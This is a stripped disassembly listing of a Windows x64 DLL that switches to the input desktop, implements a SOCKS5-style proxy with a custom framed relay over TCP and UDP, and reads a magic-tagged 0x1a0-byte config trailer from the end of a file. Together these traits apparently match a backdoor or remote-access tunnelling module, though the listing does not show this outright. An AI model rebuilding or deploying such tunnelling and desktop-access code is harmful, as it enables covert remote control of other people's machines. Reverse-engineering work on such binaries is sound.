mov [ rsp + 0x20 ] r11
call [ GetUserObjectInformationW@IAT ]
xor edx edx
mov r8d 0x2000000
xor ecx ecx
call [ OpenInputDesktop@IAT ]
lea rcx [ rsp + 0x230 ]
mov r8 r12
xor edx edx
mov rbx rax
call sub_180016870
lea r11 [ rsp + 0x440 ]
lea r8 [ rsp + 0x230 ]
lea edx [ rdi + 0x2 ]
mov r9d r12d
mov rcx rbx
mov [ rsp + 0x20 ] r11
call [ GetUserObjectInformationW@IAT ]
lea rdx [ rsp + 0x30 ]
lea rcx [ rsp + 0x230 ]
call [ lstrcmpiW@IAT ]
test eax eax
je r-xdata
mov rcx rsi
call [ CloseDesktop@IAT ]
mov rcx rbx
call [ CloseDesktop@IAT ]
lea r11 [ rsp + 0x430 ]
test edi edi
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rdi [ r11 + 0x28 ]
setne al
mov rsp r11
pop r12
retn
mov rcx rbx
call [ SetThreadDesktop@IAT ]
mov edi 0x1
sub_18000b7ec
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x130
mov rdi rcx
call [ GetCurrentThreadId@IAT ]
mov ecx eax
call [ GetThreadDesktop@IAT ]
lea r8 [ rsp + 0x30 ]
mov r9d 0x100
mov rbx rax
lea rax [ rsp + 0x148 ]
mov edx 0x2
mov rcx rdi
mov [ rsp + 0x20 ] rax
call [ GetUserObjectInformationW@IAT ]
test eax eax
jne r-xdata
mov rcx rdi
call [ SetThreadDesktop@IAT ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov rcx rbx
call [ CloseDesktop@IAT ]
mov eax 0x1
mov rbx [ rsp + 0x140 ]
add rsp 0x130
pop rdi
retn
sub_18000b868
push rbx
sub rsp 0x20
xor edx edx
test rcx rcx
je r-xdata
mov r8d 0x400001cf
xor ecx ecx
call [ OpenInputDesktop@IAT ]
mov r9d 0x400001cf
xor r8d r8d
call [ OpenDesktopW@IAT ]
jmp r-xdata
mov rcx rbx
call sub_18000b7ec
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
mov rbx rax
test rax rax
jne r-xdata
mov eax 0x1
mov rcx rbx
call [ CloseDesktop@IAT ]
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18000b8c4
push rbx
sub rsp 0x20
call [ GetCurrentThreadId@IAT ]
mov ecx eax
call [ GetThreadDesktop@IAT ]
lea rcx [ r--data ]
mov rbx rax
call sub_18000b868
test eax eax
je r-xdata
add rsp 0x20
pop rbx
retn
mov r9d 0x2e0003
xor r8d r8d
mov edx 0x312
mov ecx 0xffff
call [ PostMessageW@IAT ]
test rbx rbx
je r-xdata
mov eax 0x1
mov rcx rbx
call sub_18000b7ec
sub_18000b960
sub rsp 0x28
call sub_18000b948
cmp eax 0x4
je r-xdata
add rsp 0x28
retn
movzx eax [ rcx + 0x1c ]
mov rcx [ rcx ]
lea rdx [ rsp + 0x38 ]
mov [ rsp + 0x39 ] ax
mov eax 0xffff
mov r8d 0x5
mov [ rsp + 0x3b ] ax
mov [ rsp + 0x38 ] 0x8b
call sub_18000c18c
sub_18000b9a0
push rbx
sub rsp 0x20
cmp [ rcx + 0x9 ] 0x1
mov rbx rcx
jne r-xdata
cmp [ rcx + 0x8 ] 0xc1
jne r-xdata
or eax 0xffffffff
jmp r-xdata
xor eax eax
cmp [ rdx ] 0x5
jne r-xdata
add rsp 0x20
pop rbx
retn
mov [ rbx + 0x8 ] 0xff
cmp [ rdx + 0x1 ] 0x0
jne r-xdata
cmp [ rdx + 0x2 ] 0x0
jne r-xdata
cmp [ rdx + 0x3 ] 0x1
jne r-xdata
cmp [ r8 ] 0xa
jne r-xdata
mov eax [ rdx + 0x4 ]
mov [ rcx + 0x28 ] eax
movzx ecx [ rdx + 0x8 ]
call [ ntohs@IAT ]
mov [ rbx + 0x9 ] 0x1
mov [ rbx + 0x2c ] ax
sub_18000b9fc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x30
mov al [ rcx + 0x8 ]
xor esi esi
mov ebp r8d
mov rdi rdx
mov rbx rcx
cmp al 0xb0
jae r-xdata
cmp [ rbx + 0x9 ] 0x1
mov r8d ebp
mov rdx rdi
jne r-xdata
cmp al sil
jne r-xdata
mov rcx [ rbx + 0x20 ]
call sub_18000a1ac
movzx ecx [ rbx + 0x2c ]
mov r9d [ rbx + 0x28 ]
mov [ rsp + 0x20 ] cx
mov rcx [ rbx + 0x30 ]
call sub_18000a3a0
jmp r-xdata
cmp al 0x1
jne r-xdata
cmp [ rdx ] 0x5
jne r-xdata
cmp eax ebp
sete sil
mov eax esi
cmp al 0x2
jne r-xdata
cmp [ rdx ] al
jne r-xdata
mov [ rcx + 0x8 ] 0xff
movsx eax [ rdx + 0x1 ]
add eax 0x2
cmp r8d eax
jne r-xdata
jmp r-xdata
cmp [ rdx ] 0x5
jne r-xdata
mov [ rcx + 0x8 ] 0x2
jmp r-xdata
mov [ rcx + 0x8 ] 0x1
jmp r-xdata
cmp [ rdx + 0x1 ] 0x3
jne r-xdata
cmp [ rdx + 0x2 ] sil
jne r-xdata
mov al [ rdx + 0x3 ]
cmp al 0x1
jne r-xdata
cmp al 0x3
jne r-xdata
cmp r8d 0xa
je r-xdata
movsx eax [ rdx + 0x4 ]
add eax 0x7
cmp r8d eax
jne r-xdata
mov [ rcx + 0x8 ] 0xc1
mov [ rdx + 0x3 ] 0x1
lea rcx [ rdi + 0x4 ]
add rdx 0x8
mov ebp 0xa
call sub_18000a548
mov [ rbx + 0x30 ] rax
cmp rax rsi
jne r-xdata
mov rcx [ rbx ]
mov rdx rbx
call sub_18000c0f0
cmp eax esi
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x30
pop rdi
retn
sub_18000bb14
push rbx
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x30 ]
test rcx rcx
je r-xdata
xor eax eax
call [ closesocket@IAT ]
mov rcx [ rbx + 0x10 ]
or edx 0xffffffff
call [ WaitForSingleObject@IAT ]
mov rcx [ rbx + 0x10 ]
call [ CloseHandle@IAT ]
mov eax 0x1
jmp r-xdata
add rsp 0x20
pop rbx
retn
sub_18000bb90
push rbx
sub rsp 0x20
xor eax eax
mov rbx rcx
mov [ rcx ] eax
mov [ rcx + 0x8 ] rax
mov [ rcx + 0x10 ] rax
add rcx 0x18
call [ InitializeCriticalSection@IAT ]
mov rax rbx
add rsp 0x20
pop rbx
retn
sub_18000bbb8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
add rcx 0x18
call [ DeleteCriticalSection@IAT ]
cmp [ rdi ] 0x0
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
add rsp 0x20
pop rdi
retn
xor esi esi
cmp [ rdi ] esi
jle r-xdata
and [ rdi ] 0x0
mov rcx [ rdi + 0x8 ]
mov rbx [ rcx + 0x8 ]
call j_sub_18000e06c
inc esi
mov [ rdi + 0x8 ] rbx
cmp esi [ rdi ]
jl r-xdata
sub_18000bc0c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
add rcx 0x18
mov rbp rdx
call [ EnterCriticalSection@IAT ]
mov ecx 0x18
call sub_18000dc18
xor edi edi
mov r11 rax
cmp rax rdi
je r-xdata
lea rcx [ rbx + 0x18 ]
call [ LeaveCriticalSection@IAT ]
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov eax edi
add rsp 0x20
pop rdi
retn
xor eax eax
mov [ r11 ] rax
mov [ r11 + 0x8 ] rax
mov [ r11 + 0x10 ] rax
cmp [ rbx ] edi
jne r-xdata
mov [ r11 + 0x10 ] rbp
mov rax [ rbx + 0x10 ]
mov [ rax + 0x8 ] r11
mov rax [ rbx + 0x10 ]
mov [ r11 ] rax
mov rax [ rbx + 0x8 ]
mov [ r11 + 0x8 ] rax
mov rax [ rbx + 0x8 ]
mov [ rax ] r11
inc [ rbx ]
mov edi [ rbx ]
mov [ rbx + 0x10 ] r11
mov [ rbx + 0x8 ] r11
mov [ rbx + 0x10 ] r11
sub_18000bca8
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
add rcx 0x18
movzx ebp dx
xor edi edi
call [ EnterCriticalSection@IAT ]
cmp [ rbx ] edi
mov r8 [ rbx + 0x8 ]
mov r9d edi
jle r-xdata
lea rcx [ rbx + 0x18 ]
call [ LeaveCriticalSection@IAT ]
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov eax edi
add rsp 0x20
pop rdi
retn
mov rcx [ r8 + 0x10 ]
call sub_18000b940
cmp ax bp
je r-xdata
cmp [ rbx ] edi
je r-xdata
mov r8 [ r8 + 0x8 ]
inc r9d
cmp r9d [ rbx ]
jl r-xdata
mov edi 0x1
mov rcx [ r8 ]
mov rax [ r8 + 0x8 ]
mov [ rcx + 0x8 ] rax
mov rax [ r8 ]
mov rcx [ r8 + 0x8 ]
mov [ rcx ] rax
mov rax [ rbx + 0x8 ]
cmp r8 rax
jne r-xdata
jmp r-xdata
mov rax [ rbx + 0x10 ]
cmp r8 rax
jne r-xdata
mov rax [ rax + 0x8 ]
mov [ rbx + 0x8 ] rax
jmp r-xdata
mov rcx r8
call j_sub_18000e06c
dec [ rbx ]
mov rax [ rax ]
mov [ rbx + 0x10 ] rax
sub_18000bd64
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
add rcx 0x18
movzx ebp dx
xor edi edi
call [ EnterCriticalSection@IAT ]
mov r9d [ rbx ]
cmp r9d edi
mov r11 [ rbx + 0x8 ]
mov r8d edi
jle r-xdata
lea rcx [ rbx + 0x18 ]
call [ LeaveCriticalSection@IAT ]
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
mov rcx [ r11 + 0x10 ]
call sub_18000b940
cmp ax bp
je r-xdata
mov rdi rcx
mov r11 [ r11 + 0x8 ]
inc r8d
cmp r8d r9d
jl r-xdata
jmp r-xdata
sub_18000bddc
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rbx rcx
add rcx 0x18
call [ EnterCriticalSection@IAT ]
mov rbp [ rbx + 0x8 ]
xor esi esi
cmp [ rbx ] esi
jle r-xdata
lea rcx [ rbx + 0x18 ]
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
jmp [ LeaveCriticalSection@IAT ]
mov rcx [ rbp + 0x10 ]
mov edx 0x4
call sub_18000b954
mov rcx [ rbp + 0x10 ]
call sub_1800081cc
mov edx 0x2
mov rcx rax
call [ shutdown@IAT ]
mov rbp [ rbp + 0x8 ]
inc esi
cmp esi [ rbx ]
jl r-xdata
sub_18000be58
sub rsp 0x118
mov rdx rcx
lea rcx [ rsp + 0x20 ]
xor r8d r8d
call sub_18000beb4
lea rcx [ rsp + 0x20 ]
call sub_18000c558
lea rcx [ rsp + 0x20 ]
test eax eax
je r-xdata
call sub_18000c5f0
lea rcx [ rsp + 0x20 ]
call sub_18000bef0
xor eax eax
add rsp 0x118
retn
call sub_18000c630
lea rcx [ rsp + 0x20 ]
test eax eax
je r-xdata
call sub_18000c5c8
lea rcx [ rsp + 0x20 ]
sub_18000beb4
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
add rcx 0x78
mov rbx rdx
call sub_18000bb90
and [ rdi + 0x30 ] 0x0
lea rcx [ rdi + 0x8 ]
mov [ rdi ] rbx
call [ InitializeCriticalSection@IAT ]
mov rbx [ rsp + 0x30 ]
mov rax rdi
add rsp 0x20
pop rdi
retn
sub_18000bf14
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x840
mov rbx rcx
call sub_18000b94c
mov rdi rax
call sub_18000b940
mov [ rsp + 0x40 ] 0x8b
mov [ rsp + 0x41 ] ax
mov [ rsp + 0x850 ] 0x10
jmp r-xdata
call sub_18000b948
test eax eax
je r-xdata
or edx 0xffffffff
mov rcx rdi
call sub_18000a0dc
test eax eax
jle r-xdata
lea r11 [ rsp + 0x840 ]
xor eax eax
mov rbx [ r11 + 0x18 ]
mov rsi [ r11 + 0x20 ]
mov rsp r11
pop rdi
retn
lea rax [ rsp + 0x850 ]
lea rdx [ rsp + 0x45 ]
xor r9d r9d
mov [ rsp + 0x28 ] rax
lea rax [ rsp + 0x30 ]
mov r8d 0x7fb
mov rcx rdi
mov [ rsp + 0x20 ] rax
call [ recvfrom@IAT ]
mov esi eax
test eax eax
jle r-xdata
mov rcx rbx
call sub_18000bb54
movzx ecx [ rsp + 0x32 ]
call [ ntohs@IAT ]
mov edx [ rsp + 0x34 ]
mov rcx rbx
movzx r8d ax
call sub_18000bb60
mov rcx [ rbx ]
lea r8d [ rsi + 0x5 ]
lea rdx [ rsp + 0x40 ]
mov [ rsp + 0x43 ] si
call sub_18000c18c
test eax eax
je r-xdata
mov rcx rbx
sub_18000bffc
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
mov [ rsp + 0x20 ] rsi
push rdi
sub rsp 0x5e0
mov rbx rcx
call sub_1800081cc
mov rbp [ rcx ]
mov rsi rax
call sub_18000b940
mov [ rsp + 0x20 ] 0x8b
mov [ rsp + 0x21 ] ax
jmp r-xdata
call sub_18000b948
test eax eax
je r-xdata
or edx 0xffffffff
mov rcx rsi
call sub_18000a0dc
test eax eax
jle r-xdata
mov rcx rsi
call [ closesocket@IAT ]
mov rcx rbx
call sub_18000bb14
mov rcx rbx
call sub_18000b960
movzx edx [ rsp + 0x21 ]
mov rcx rbp
call sub_18000c180
mov rcx rbx
call j_sub_18000e06c
lea r11 [ rsp + 0x5e0 ]
xor eax eax
mov rbx [ r11 + 0x18 ]
mov rbp [ r11 + 0x20 ]
mov rsi [ r11 + 0x28 ]
mov rsp r11
pop rdi
retn
lea rdx [ rsp + 0x25 ]
xor r9d r9d
mov r8d 0x5af
mov rcx rsi
call [ recv@IAT ]
mov edi eax
mov [ rsp + 0x5f0 ] eax
test eax eax
jle r-xdata
lea r8 [ rsp + 0x5f0 ]
lea rdx [ rsp + 0x25 ]
mov rcx rbx
call sub_18000b9a0
cmp eax 0xffffffff
je r-xdata
mov rcx [ rbx ]
lea r8d [ rdi + 0x5 ]
lea rdx [ rsp + 0x20 ]
mov [ rsp + 0x23 ] di
call sub_18000c18c
test eax eax
je r-xdata
mov rcx rbx
sub_18000c0f0
push rbx
sub rsp 0x30
lea rax [ rsp + 0x50 ]
mov rbx rdx
mov r9 rdx
mov [ rsp + 0x28 ] rax
and [ rsp + 0x20 ] 0x0
lea r8 [ sub_18000bf14 ]
xor edx edx
xor ecx ecx
call sub_18000d30c
test rax rax
je r-xdata
xor eax eax
mov rdx rax
mov rcx rbx
call sub_18000b958
mov eax 0x1
jmp r-xdata
add rsp 0x30
pop rbx
retn
sub_18000c13c
sub rsp 0x38
lea rax [ rsp + 0x50 ]
mov r9 rdx
lea r8 [ sub_18000bffc ]
mov [ rsp + 0x28 ] rax
and [ rsp + 0x20 ] 0x0
xor edx edx
xor ecx ecx
call sub_18000d30c
test rax rax
je r-xdata
xor eax eax
mov rcx rax
call [ CloseHandle@IAT ]
mov eax 0x1
jmp r-xdata
add rsp 0x38
retn
sub_18000c18c
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov rdi rcx
add rcx 0x8
mov ebp r8d
mov rbx rdx
call [ EnterCriticalSection@IAT ]
mov rcx [ rdi ]
mov r8d ebp
mov rdx rbx
call sub_18000a1ac
xor ebx ebx
lea rcx [ rdi + 0x8 ]
cmp eax ebp
sete bl
call [ LeaveCriticalSection@IAT ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov eax ebx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
sub_18000c1ec
push rbx
sub rsp 0x30
lea rax [ rsp + 0x48 ]
mov rbx rcx
mov r9 rcx
mov [ rsp + 0x28 ] rax
and [ rsp + 0x20 ] 0x0
lea r8 [ sub_18000c230 ]
xor edx edx
xor ecx ecx
call sub_18000d30c
test rax rax
je r-xdata
xor eax eax
mov [ rbx + 0x30 ] rax
mov eax 0x1
jmp r-xdata
add rsp 0x30
pop rbx
retn
sub_18000c230
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
push r13
push r15
mov eax 0x10020
call sub_1800232c0
sub rsp rax
mov r12 [ rcx ]
mov rbx rcx
mov edx 0x13880
mov rcx r12
mov r8d 0x1388
call sub_18000a2e8
or r9d 0xffffffff
lea rdx [ rsp + 0x10050 ]
lea r8d [ r9 + 0x6 ]
mov rcx r12
call sub_18000a128
xor r13d r13d
cmp eax r13d
je r-xdata
mov [ rbx + 0x6c ] 0x1
lea rcx [ r--data ]
add rbx 0x38
sub rbx rcx
mov r15d 0xffff
lea rbp [ r--data ]
mov al [ rcx ]
mov [ rbx + rcx ] al
inc rcx
cmp al r13b
jne r-xdata
lea r11 [ rsp + 0x10020 ]
xor eax eax
mov rbx [ r11 + 0x38 ]
mov rbp [ r11 + 0x40 ]
mov rsp r11
pop r15
pop r13
pop r12
pop rdi
pop rsi
retn
mov [ rbx + 0x6c ] 0x2
lea rcx [ r--data ]
add rbx 0x38
sub rbx rcx
movzx eax [ rsp + 0x10053 ]
cmp ax r13w
je r-xdata
mov al [ rcx ]
mov [ rbx + rcx ] al
inc rcx
cmp al r13b
jne r-xdata
jmp r-xdata
movzx edx [ rsp + 0x10051 ]
lea rcx [ rbx + 0x78 ]
call sub_18000bd64
mov rdi rax
cmp rax r13
je r-xdata
cmp ax r15w
je r-xdata
cmp [ rsp + 0x10053 ] r13w
jne r-xdata
movzx edx [ rsp + 0x10053 ]
cmp dx r15w
jne r-xdata
lea rdx [ rsp + 0x20 ]
movzx r8d ax
or r9d 0xffffffff
mov rcx r12
call sub_18000a128
cmp eax r13d
je r-xdata
or r9d 0xffffffff
lea rdx [ rsp + 0x10050 ]
mov rcx r12
lea r8d [ r9 + 0x6 ]
call sub_18000a128
cmp eax r13d
jne r-xdata
movzx edx [ rbx + 0xea ]
lea rcx [ rbx + 0xb8 ]
call sub_18000a010
mov rbp rax
cmp rax r13
jne r-xdata
cmp dx r13w
je r-xdata
mov edx 0x4
mov rcx rax
call sub_18000b954
call sub_18000bb6c
mov dx [ rsp + 0x10053 ]
mov [ rbx + 0x6c ] 0x1
lea rcx [ r--data ]
add rbx 0x38
sub rbx rcx
cmp [ rsp + 0x10050 ] 0x8b
jne r-xdata
mov ecx 0x38
call sub_18000dc18
cmp rax r13
je r-xdata
lea rdi [ r--data ]
mov rdx rbx
mov [ rbx + 0x6c ] 0x4
mov rcx rdi
sub rdx rdi
cmp dx r15w
je r-xdata
mov al [ rcx ]
mov [ rbx + rcx ] al
inc rcx
cmp al r13b
jne r-xdata
jmp r-xdata
mov rdi r13
movzx r8d [ rsp + 0x10051 ]
mov r9 rbp
mov rdx rbx
mov rcx rax
call sub_18000b91c
mov rdi rax
jmp r-xdata
mov al [ rcx ]
inc rcx
mov [ rdx + rcx + 0x37 ] al
cmp al r13b
jne r-xdata
lea rdx [ rsp + 0x10050 ]
mov r8d 0x5
mov rcx rbx
mov [ rsp + 0x10053 ] r15w
call sub_18000c18c
jmp r-xdata
mov rcx rdi
call sub_18000b948
cmp eax r13d
jne r-xdata
mov rdx rdi
mov rcx rbx
call sub_18000c13c
cmp eax r13d
je r-xdata
lea rdi [ r--data ]
mov rdx rbx
mov [ rbx + 0x6c ] 0x4
mov rcx rdi
sub rdx rdi
cmp rdi r13
jne r-xdata
lea rbp [ r--data ]
movzx r8d dx
lea rdx [ rsp + 0x20 ]
call sub_18000b9fc
cmp eax r13d
jne r-xdata
mov rcx rdi
call sub_18000b960
mov rcx rdi
call j_sub_18000e06c
lea rcx [ rbx + 0x78 ]
mov rdx rdi
call sub_18000bc0c
jmp r-xdata
mov al [ rcx ]
inc rcx
mov [ rdx + rcx + 0x37 ] al
cmp al r13b
jne r-xdata
lea rdx [ rsp + 0x10050 ]
mov r8d 0x5
mov rcx rbx
mov [ rsp + 0x10053 ] r15w
call sub_18000c18c
mov rcx rbp
call [ closesocket@IAT ]
jmp r-xdata
mov rdx rbx
mov [ rbx + 0x6c ] 0x4
mov rcx rbp
sub rdx rbp
mov al [ rcx ]
inc rcx
mov [ rdx + rcx + 0x37 ] al
cmp al r13b
jne r-xdata
mov rcx rdi
call sub_18000bb6c
jmp r-xdata
sub_18000c558
push rbx
sub rsp 0x60
or r9d 0xffffffff
mov rbx rcx
mov rcx [ rcx ]
lea r8d [ r9 + 0x35 ]
lea rdx [ rsp + 0x20 ]
call sub_18000a128
test eax eax
jne r-xdata
lea rcx [ rbx + 0xb8 ]
lea rdx [ rsp + 0x20 ]
mov r8d 0x34
mov [ rsp + 0x51 ] 0x0
call sub_1800160e0
mov eax 0x1
lea rcx [ r--data ]
lea rdx [ rbx + 0x38 ]
mov [ rbx + 0x6c ] 0x1
sub rdx rcx
mov al [ rcx ]
mov [ rdx + rcx ] al
inc rcx
test al al
jne r-xdata
xor eax eax
jmp r-xdata
add rsp 0x60
pop rbx
retn
sub_18000c5f0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
add rcx 0x78
call sub_18000bddc
jmp r-xdata
cmp [ rbx + 0x78 ] 0x0
jg r-xdata
mov ecx 0xa
call [ Sleep@IAT ]
mov rcx [ rbx ]
call [ closesocket@IAT ]
mov rbx [ rsp + 0x30 ]
xor eax eax
add rsp 0x20
pop rdi
retn
sub_18000c63c
sub rsp 0x28
mov ecx 0xfffffff5
call [ GetStdHandle@IAT ]
lea rcx [ rw-data ]
mov [ rw-data ] rax
call [ InitializeCriticalSection@IAT ]
lea rcx [ rw-data ]
xor edx edx
mov r8d 0x800
call sub_180016870
xor r11d r11d
lea rax [ rw-data ]
mov rdx r11
lea rcx [ r--data ]
movzx ecx [ rdx + rcx ]
mov [ rdx + rax ] cx
add rdx 0x2
cmp cx r11w
jne r-xdata
add rsp 0x28
retn
sub_18000c6c4
sub rsp 0x28
lea rcx [ rw-data ]
call [ EnterCriticalSection@IAT ]
xor r11d r11d
lea rcx [ __dos_header ]
mov rdx r11
movzx eax [ rdx + rcx + 0x27710 ]
add rdx 0x2
mov [ rdx + rcx + 0x332ee ] ax
cmp ax r11w
jne r-xdata
lea rcx [ rw-data ]
add rsp 0x28
jmp [ LeaveCriticalSection@IAT ]
sub_18000c71c
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x10 ] rbp
mov [ r11 + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x40
mov r12d r9d
mov rbp r8
mov r13 rdx
mov rsi rcx
test r8 r8
je r-xdata
xor eax eax
test rcx rcx
je r-xdata
xor eax eax
or rcx 0xffffffffffffffff
mov rdi r8
and [ r11 - 0x20 ] rax
and [ r11 - 0x28 ] rax
and [ rsp + 0x28 ] eax
and [ r11 - 0x38 ] rax
[ rdi ]
xor edx edx
not rcx
lea r9d [ rcx - 0x1 ]
lea rbx [ rcx - 0x1 ]
mov ecx r12d
call [ WideCharToMultiByte@IAT ]
mov r9d ebx
mov r8 rbp
movsxd rdi eax
mov ecx r12d
cmp rdi r13
cmova edi r13d
and [ rsp + 0x38 ] 0x0
and [ rsp + 0x30 ] 0x0
xor edx edx
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rsi
call [ WideCharToMultiByte@IAT ]
movsxd rdx edi
mov rax rsi
mov [ rdx + rsi ] 0x0
jmp r-xdata
mov rbx [ rsp + 0x60 ]
mov rbp [ rsp + 0x68 ]
mov rsi [ rsp + 0x70 ]
add rsp 0x40
pop r13
pop r12
pop rdi
retn
sub_18000c7d4
mov r11 rsp
mov [ r11 + 0x8 ] rbx
mov [ r11 + 0x10 ] rbp
mov [ r11 + 0x18 ] rsi
mov [ r11 + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x30
xor r14d r14d
mov r12d r9d
mov rsi r8
mov rbp rdx
mov rbx rcx
cmp rcx r14
je r-xdata
xor eax eax
cmp r8 r14
je r-xdata
or rcx 0xffffffffffffffff
xor eax eax
mov rdi r8
[ rdi ]
mov [ r11 - 0x20 ] r14d
xor edx edx
not rcx
mov [ r11 - 0x28 ] r14
lea r9d [ rcx - 0x1 ]
lea r13 [ rcx - 0x1 ]
mov ecx r12d
call [ MultiByteToWideChar@IAT ]
movsxd rdi eax
cmp rdi rbp
jb r-xdata
mov r9d r13d
mov r8 rsi
xor edx edx
mov ecx r12d
mov [ rsp + 0x28 ] edi
mov [ rsp + 0x20 ] rbx
call [ MultiByteToWideChar@IAT ]
mov [ rbx + rdi * 2 ] r14w
mov rax rbx
jmp r-xdata
lea rdi [ rbp - 0x1 ]
mov rbx [ rsp + 0x50 ]
mov rbp [ rsp + 0x58 ]
mov rsi [ rsp + 0x60 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x30
pop r14
pop r13
pop r12
retn
sub_18000c884
mov rax rsp
mov [ rax + 0x8 ] rbx
mov [ rax + 0x10 ] rsi
mov [ rax + 0x18 ] rdi
mov [ rax + 0x20 ] r12
movzx r8d [ rcx ]
xor edi edi
mov r9 rcx
mov r10 rdx
mov r11 rdx
mov bl dil
cmp r8w di
je r-xdata
mov rbx [ rsp + 0x8 ]
mov rsi [ rsp + 0x10 ]
mov r12 [ rsp + 0x20 ]
mov [ rdx ] di
mov rdi [ rsp + 0x18 ]
sub rdx r10
sar rdx 0x1
mov eax edx
retn
lea esi [ rdi + 0x5c ]
lea r12d [ rdi + 0x2e ]
cmp r8w r12w
jne r-xdata
sub ecx 0x1
je r-xdata
cmp r8w di
je r-xdata
lea rax [ r9 + 0x2 ]
cmp [ rax ] si
je r-xdata
cmp [ rdx - 0x2 ] si
je r-xdata
cmp ecx 0x2d
jne r-xdata
mov rcx rdx
sub rcx r10
mov r9 rax
cmp [ rax ] si
je r-xdata
cmp [ rax ] 0x2f
je r-xdata
add r9 0x2
jmp r-xdata
cmp bl dil
jne r-xdata
mov r8w [ r9 ]
cmp r8w di
jne r-xdata
cmp r8w 0x2f
je r-xdata
cmp [ rax ] 0x2f
jne r-xdata
cmp [ rax ] di
je r-xdata
mov [ rdx ] si
add rdx 0x2
mov rax rdx
sub rax r10
and rax 0xfffffffffffffffe
cmp rax 0x206
jge r-xdata
mov r11 rdx
mov bl 0x1
movzx ecx r8w
sub ecx r12d
je r-xdata
add rcx 0x2
mov [ rdx ] r8w
add r9 0x2
mov rax rcx
add rdx 0x2
and rax 0xfffffffffffffffe
cmp rax 0x206
jge r-xdata
jmp r-xdata
cmp [ rax ] r12w
jne r-xdata
mov r8w [ r9 ]
cmp r8w di
jne r-xdata
cmp [ r9 + 0x4 ] si
je r-xdata
cmp r8w si
je r-xdata
cmp [ rdx ] si
jne r-xdata
cmp [ r9 + 0x4 ] 0x2f
je r-xdata
cmp rdx r10
jbe r-xdata
cmp rdx r11
je r-xdata
cmp [ r9 + 0x4 ] di
je r-xdata
sub rdx 0x2
cmp [ rdx ] si
jne r-xdata
sub rdx 0x2
cmp [ rdx ] si
jne r-xdata
add r9 0x4
jmp r-xdata
add rdx 0x2
cmp rdx r11
jne r-xdata
sub_18000ca20
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov rdi rcx
xor ebx ebx
jmp r-xdata
lea rdx [ r--data ]
mov r8d 0x1
call sub_18000f518
test eax eax
je r-xdata
inc ebx
movsxd rax ebx
lea rcx [ rdi + rax * 2 ]
movsxd rax ebx
mov rbx [ rsp + 0x30 ]
lea rax [ rdi + rax * 2 ]
add rsp 0x20
pop rdi
retn
sub_18000ca64
mov rax rsp
mov [ rax + 0x8 ] rbx
push rdi
sub rsp 0x40
and [ rax - 0x18 ] 0x0
xor r9d r9d
mov rdi rcx
mov [ rax - 0x20 ] 0x80
lea rcx [ rw-data ]
lea r8d [ r9 + 0x1 ]
mov edx 0x80000000
mov [ rax - 0x28 ] 0x3
call [ CreateFileW@IAT ]
mov rbx rax
cmp rax 0xffffffffffffffff
je r-xdata
xor al al
xor edx edx
mov rcx rax
call [ GetFileSize@IAT ]
xor r9d r9d
xor r8d r8d
lea edx [ rax - 0x1a0 ]
mov rcx rbx
call [ SetFilePointer@IAT ]
and [ rsp + 0x20 ] 0x0
lea r9 [ rsp + 0x60 ]
mov r8d 0x1a0
mov rdx rdi
mov rcx rbx
call [ ReadFile@IAT ]
test eax eax
je r-xdata
mov rcx rbx
cmp [ rsp + 0x60 ] 0x1a0
jne r-xdata
cmp [ rdi ] 0xcc716
mov rcx rbx
jne r-xdata
call [ CloseHandle@IAT ]
call [ CloseHandle@IAT ]
mov al 0x1
jmp r-xdata
mov rbx [ rsp + 0x50 ]
add rsp 0x40
pop rdi
retn
sub_18000cb20
mov [ rsp + 0x8 ] rbx
